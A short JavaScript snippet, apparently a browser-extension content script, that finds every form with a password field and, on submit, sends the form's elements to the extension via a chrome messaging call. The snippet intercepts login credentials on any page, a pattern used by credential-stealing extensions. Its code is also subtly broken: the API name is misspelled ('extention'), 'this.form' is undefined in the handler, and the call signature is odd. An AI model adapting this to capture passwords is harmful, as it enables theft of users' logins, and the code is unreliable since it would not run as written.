for (var i = 0; i < document.forms.length; i++) {
  if (document.forms[i].querySelector('input[type="password"]') !== null) {
    document.forms[i].addEventListener("submit", function () {
      chrome.extention.sendRequest(
        {
          name: "submit",
          data: this.form.elements,
        },
        function () {},
        false
      );
    });
  }
}
